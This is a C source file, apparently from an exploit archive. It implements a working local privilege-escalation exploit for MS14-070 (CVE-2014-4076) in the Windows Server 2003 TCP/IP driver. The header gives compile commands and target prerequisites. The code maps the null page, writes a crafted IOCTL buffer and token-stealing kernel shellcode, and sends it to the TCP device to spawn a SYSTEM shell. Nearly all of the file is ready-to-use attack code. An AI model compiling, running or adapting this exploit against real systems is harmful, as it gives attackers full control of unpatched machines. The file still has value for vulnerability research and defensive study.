/*
################################################################
# Exploit Title: Windows 2k3 SP2 TCP/IP IOCTL Privilege Escalation (MS14-070)
# Date: 2015-08-10
# Exploit Author: Tomislav Paskalev
# Vulnerable Software:
#   Windows 2003 SP2 x86
#   Windows 2003 SP2 x86-64
#   Windows 2003 SP2 IA-64
# Supported vulnerable software:
#   Windows 2003 SP2 x86
# Tested on:
#   Windows 2003 SP2 x86 EN
# CVE ID:   2014-4076
# OSVDB-ID: 114532
################################################################
# Vulnerability description:
#   Windows TCP/IP stack (tcpip.sys, tcpip6.sys) fails to
#   properly handle objects in memory during IOCTL processing.
#   By crafting an input buffer that will be passed to the TCP
#   device through the DeviceIoControlFile() function, it is
#   possible to trigger a vulnerability that would allow an
#   attacker to elevate privileges.
#   An attacker who successfully exploited this vulnerability
#   could run arbitrary code in kernel mode (i.e. with SYSTEM
#   privileges).
################################################################
# Exploit notes:
#   Privileged shell execution:
#     - the SYSTEM shell will spawn within the existing shell
#       (i.e. exploit usable via a remote shell)
#       - upon exiting the SYSTEM shell, the parent process
#         will become unresponsive/hang
#   Exploit compiling:
#     - # i586-mingw32msvc-gcc MS14-070.c -o MS14-070.exe
#   Exploit prerequisites:
#     - low privilege access to the target (remote shell or RDP)
#     - target not patched (KB2989935 not installed)
################################################################
# Patch:
#   https://www.microsoft.com/en-us/download/details.aspx?id=44646
################################################################
# Thanks to:
#   KoreLogic (Python PoC)
#   ChiChou (C++ PoC)
################################################################
# References:
#   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4076
#   https://technet.microsoft.com/library/security/ms14-070
#   https://www.exploit-db.com/exploits/35936/
#   https://github.com/ChiChou/CVE-2014-4076/blob/master/CVE-2014-4076/CVE-2014-4076.cpp
#   https://www.osronline.com/article.cfm?article=229
################################################################
*/


#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>




typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemBasicInformation                = 0,
        SystemPerformanceInformation          = 2,
        SystemTimeOfDayInformation            = 3,
        SystemProcessInformation              = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemInterruptInformation            = 23,
        SystemExceptionInformation            = 33,
        SystemRegistryQuotaInformation        = 37,
        SystemLookasideInformation            = 45
} SYSTEM_INFORMATION_CLASS;


typedef DWORD NTSTATUS;
NTSTATUS WINAPI NtQuerySystemInformation (
        SYSTEM_INFORMATION_CLASS   SystemInformationClass,
        PVOID                      SystemInformation,
        ULONG                      SystemInformationLength,
        PULONG                     ReturnLength
);


typedef struct _IO_STATUS_BLOCK {
        union {
                NTSTATUS           Status;
                PVOID              Pointer;
        };
        ULONG_PTR                  Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;


typedef void (WINAPI * PIO_APC_ROUTINE) (PVOID, PIO_STATUS_BLOCK, ULONG);


NTSTATUS (WINAPI *ZwAllocateVirtualMemory) (
        HANDLE                     ProcessHandle,
        PVOID                      *BaseAddress,
        ULONG_PTR                  ZeroBits,
        PSIZE_T                    RegionSize,
        ULONG                      AllocationType,
        ULONG                      Protect
);


NTSTATUS (WINAPI *ZwDeviceIoControlFile) (
        HANDLE                     FileHandle,
        PVOID                      ApcContext,
        PIO_STATUS_BLOCK           IoStatusBlock,
        ULONG                      IoControlCode,
        PVOID                      InputBuffer,
        ULONG                      InputBufferLength,
        PVOID                      OutputBuffer,
        ULONG                      OutputBufferLength
);




BOOL WINAPI CreateNewCmdProcess (STARTUPINFO *startupInformation, PROCESS_INFORMATION *processInformation)
{
        ZeroMemory (&startupInformation[0], sizeof (STARTUPINFO));
        startupInformation->cb = sizeof (STARTUPINFO);
        ZeroMemory (&processInformation[0], sizeof (PROCESS_INFORMATION));

        // Start the child process.
        return CreateProcess (
                NULL,                                                           // No module name (use command line)
                "c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32",   // Start cmd.exe
                NULL,                                                           // Process handle not inheritable
                NULL,                                                           // Thread handle not inheritable
                TRUE,                                                           // Set handle inheritance to TRUE
                0,                                                              // No creation flags
                NULL,                                                           // Use parent's environment block
                NULL,                                                           // Use parent's starting directory
                &startupInformation[0],                                         // Pointer to STARTUPINFO structure
                &processInformation[0]                                          // Pointer to PROCESS_INFORMATION structure
        );
}




unsigned long SwapBytes (unsigned long inputByteUL)
{
        return (((inputByteUL&0x000000FF) << 24) + ((inputByteUL&0x0000FF00) << 8) +
        ((inputByteUL&0x00FF0000) >> 8) + ((inputByteUL&0xFF000000) >> 24));
}




BOOL WriteToAllocMem (unsigned char *exploitBuffer, unsigned char *shellcode)
{
        int returnAllocMemValue1, returnAllocMemValue2, returnAllocMemValue3, returnAllocMemValue4, returnAllocMemValue5;

        returnAllocMemValue1 = WriteProcessMemory (
                (HANDLE) 0xFFFFFFFF,
                (LPVOID) 0x28,
                "\x87\xff\xff\x38",
                4,
                NULL
        );
        returnAllocMemValue2 = WriteProcessMemory (
                (HANDLE) 0xFFFFFFFF,
                (LPVOID) 0x38,
                "\x00\x00",
                2,
                NULL
        );
        returnAllocMemValue3 = WriteProcessMemory (
                (HANDLE) 0xFFFFFFFF,
                (LPVOID) 0x1100,
                &exploitBuffer[0],
                32,
                NULL
        );
        returnAllocMemValue4 = WriteProcessMemory (
                (HANDLE) 0xFFFFFFFF,
                (LPVOID) 0x2b,
                "\x00\x00",
                2,
                NULL
        );
        returnAllocMemValue5 = WriteProcessMemory (
                (HANDLE) 0xFFFFFFFF,
                (LPVOID) 0x2000,
                &shellcode[0],
                96,
                NULL
        );

        if (returnAllocMemValue1 == 0 ||
        returnAllocMemValue2 == 0 ||
        returnAllocMemValue3 == 0 ||
        returnAllocMemValue4 == 0 ||
        returnAllocMemValue5 == 0)
                return FALSE;
        else
                return TRUE;
}




int main (void)
{
        fprintf (stderr, "[*] MS14-070 (CVE-2014-4076) x86\n");
        fprintf (stderr, "    [*] by Tomislav Paskalev\n");
        fflush (stderr);


        ////////////////////////////////
        // CREATE NEW CME.EXE PROCESS
        ////////////////////////////////

        STARTUPINFO *startupInformation = (STARTUPINFO *) malloc (sizeof (STARTUPINFO));
        PROCESS_INFORMATION *processInformation = (PROCESS_INFORMATION *) malloc (sizeof (PROCESS_INFORMATION));

        if (!CreateNewCmdProcess (&startupInformation[0], &processInformation[0]))
        {
                fprintf (stderr, "[-] Creating a new process failed\n");
                fprintf (stderr, "    [*] Error code   : %d\n", GetLastError());
                fflush (stderr);
                ExitProcess (1);
        }

        fprintf (stderr, "[+] Created a new cmd.exe process\n");
        fflush (stderr);


        ////////////////////////////////
        // CONVERT PID TO HEX LE
        ////////////////////////////////

        unsigned long pidLittleEndian = SwapBytes ((unsigned long) processInformation->dwProcessId);
        fprintf (stderr, "    [*] PID [dec]    :   %#8lu\n", (unsigned long) processInformation->dwProcessId);
        fprintf (stderr, "    [*] PID [hex]    : %#010x\n", (unsigned long) processInformation->dwProcessId);
        fprintf (stderr, "    [*] PID [hex LE] : %#010x\n", pidLittleEndian);

        /*four bytes of hex = 8 characters, plus NULL terminator*/
        unsigned char pidLittleEndianString[9];

        sprintf (&pidLittleEndianString[0], "%04x", pidLittleEndian);


        ////////////////////////////////
        // CREATE SHELLCODE
        ////////////////////////////////

        unsigned char exploitBuffer[] =
        "\x00\x04\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00"
        "\x22\x00\x00\x00\x04\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00";
        unsigned char shellcode[] =
        "\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x38\x50\xBB\x04\x00\x00\x00"
        "\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94\x00\x00"
        "\x00\x75\xED\x8B\xB8\xD8\x00\x00\x00\x83\xE7\xF8\x58\xBB\x41\x41"
        "\x41\x41\x8B\x80\x98\x00\x00\x00\x2D\x98\x00\x00\x00\x39\x98\x94"
        "\x00\x00\x00\x75\xED\x89\xB8\xD8\x00\x00\x00\x61\xBA\x11\x11\x11"
        "\x11\xB9\x22\x22\x22\x22\xB8\x3B\x00\x00\x00\x8E\xE0\x0F\x35\x00";

        int counter;
        for (counter = 0; counter < 4; counter++)
        {
                char buffer[3] = {pidLittleEndianString[counter * 2], pidLittleEndianString[(counter * 2) + 1], 0};
                shellcode[46 + counter] = strtol (buffer, NULL, 16);
        }

        shellcode[77] = strtol ("39", NULL, 16);
        shellcode[78] = strtol ("ff", NULL, 16);
        shellcode[79] = strtol ("a2", NULL, 16);
        shellcode[80] = strtol ("ba", NULL, 16);

        shellcode[82] = strtol ("0", NULL, 16);
        shellcode[83] = strtol ("0", NULL, 16);
        shellcode[84] = strtol ("0", NULL, 16);
        shellcode[85] = strtol ("0", NULL, 16);

        fprintf (stderr, "[+] Modified shellcode\n");
        fflush (stderr);


        ////////////////////////////////
        // CREATE HANDLE ON TCPIP.SYS
        ////////////////////////////////

        HANDLE tcpIPDeviceHandle = CreateFileA (
                "\\\\.\\Tcp",
                0,
                0,
                NULL,
                OPEN_EXISTING,
                0,
                NULL
        );

        if (tcpIPDeviceHandle == INVALID_HANDLE_VALUE)
        {
                printf ("[-] Opening TCP/IP I/O dev failed\n");
                printf ("    [*] Error code   : %d\n", GetLastError());
                ExitProcess (1);
        }

        fprintf (stderr, "[+] Opened TCP/IP I/O device\n");
        fflush (stderr);


        ////////////////////////////////
        // ALLOCATE MEMORY - FIRST PAGE
        ////////////////////////////////

        FARPROC ZwAllocateVirtualMemory;

        ZwAllocateVirtualMemory = GetProcAddress (GetModuleHandle ("NTDLL.DLL"), "ZwAllocateVirtualMemory");

        fprintf (stderr, "[*] ntdll.dll address: 0x%p\n", ZwAllocateVirtualMemory);
        fflush (stderr);

        NTSTATUS AllocMemReturnCode;
        ULONG BaseAddress = 0x1000, RegionSize = 0x4000;

        AllocMemReturnCode = ZwAllocateVirtualMemory (
                (HANDLE) 0xFFFFFFFF,
                &BaseAddress,
                0,
                &RegionSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
        );

        if (AllocMemReturnCode != 0)
        {
                printf ("[-] Allocating memory failed\n");
                printf ("    [*] Error code   : %#X\n", AllocMemReturnCode);
                ExitProcess (1);
        }

        fprintf (stderr, "[+] Allocated memory\n");
        fprintf (stderr, "    [*] BaseAddress  : 0x%p\n", BaseAddress);
        fprintf (stderr, "    [*] RegionSize   : %#010x\n", RegionSize);
        fflush (stderr);


        ////////////////////////////////
        // WRITE EXPLOIT TO PROCESS MEM
        ////////////////////////////////

        fprintf (stderr, "[*] Writing exploit...\n");
        fflush (stderr);

        if (!WriteToAllocMem (&exploitBuffer[0], &shellcode[0]))
        {
                fprintf (stderr, "    [-] Failed to write to memory\n");
                fprintf (stderr, "        [*] Err code : %d\n", GetLastError ());
                fflush (stderr);
                ExitProcess (1);
        }
        else
        {
                fprintf (stderr, "    [+] done\n");
                fflush (stderr);
        }


        ////////////////////////////////
        // SEND EXPLOIT TO TCPIP.SYS
        ////////////////////////////////

        fprintf (stderr, "[*] Spawning SYSTEM shell...\n");
        fprintf (stderr, "    [*] Parent proc hangs on exit\n");
        fflush (stderr);

        FARPROC ZwDeviceIoControlFile;
        NTSTATUS DevIoCtrlReturnCode;
        ULONG ioStatus = 8;

        ZwDeviceIoControlFile = GetProcAddress (GetModuleHandle ("NTDLL.DLL"), "ZwDeviceIoControlFile");

        DevIoCtrlReturnCode = ZwDeviceIoControlFile (
                tcpIPDeviceHandle,
                NULL,
                NULL,
                NULL,
                (PIO_STATUS_BLOCK) &ioStatus,
                0x00120028,                                //Device: NETWORK (0x12)
                                                        //Function: 0xa
                                                        //Access: FILE_ANY_ACCESS
                                                        //Method: METHOD_BUFFERED
                (PVOID) 0x1100,                                //NULL,                //Test
                32,                                        //0,                //Test
                NULL,
                0
        );

        if (DevIoCtrlReturnCode != 0)
        {
                fprintf (stderr, "    [-] Exploit failed (->TCP/IP)\n");
                fprintf (stderr, "        [*] Err code : %d\n", GetLastError ());
                fflush (stderr);
                ExitProcess (1);
        }


        ////////////////////////////////
        // WAIT FOR CHILD PROCESS; EXIT
        ////////////////////////////////

        // Wait until child process exits.
        WaitForSingleObject (processInformation->hProcess, INFINITE);

        fprintf (stderr, "[*] Exiting SYSTEM shell...\n");
        fflush (stderr);

        // Close process and thread handles.
        CloseHandle (tcpIPDeviceHandle);
        CloseHandle (processInformation->hProcess);
        CloseHandle (processInformation->hThread);

        return 1;
}
